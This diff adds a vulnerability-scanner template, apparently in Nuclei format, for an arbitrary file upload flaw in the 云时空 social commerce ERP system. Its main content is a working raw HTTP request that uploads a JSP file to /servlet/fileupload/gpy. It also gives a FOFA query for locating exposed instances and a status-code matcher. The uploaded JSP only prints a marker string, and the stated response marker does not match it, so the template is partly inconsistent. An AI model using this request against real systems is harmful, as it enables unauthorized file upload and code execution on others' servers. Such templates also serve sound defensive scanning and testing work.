@@ -1,0 +1,71 @@
+id: poc-qqag1gty50cso596
+info:
+  name: 云时空社会化商业ERP系统gpy任意文件上传漏洞RCE
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qqag1gty50cso596'
+  tags: rce,file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qqag1gty50cso596
+    fofa: app="云时空社会化商业ERP系统"
+http:
+- raw:
+  - 'POST /servlet/fileupload/gpy HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
+
+
+
+
+    --4eea98d02AEa93f60ea08dE3C18A1388
+
+
+    Content-Disposition: form-data; name="file1"; filename="dudesuite.jsp"
+
+
+    Content-Type: application/octet-stream
+
+
+
+
+    <% out.println("dudesuite"); %>
+
+
+    --4eea98d02AEa93f60ea08dE3C18A1388--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    jspdate
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
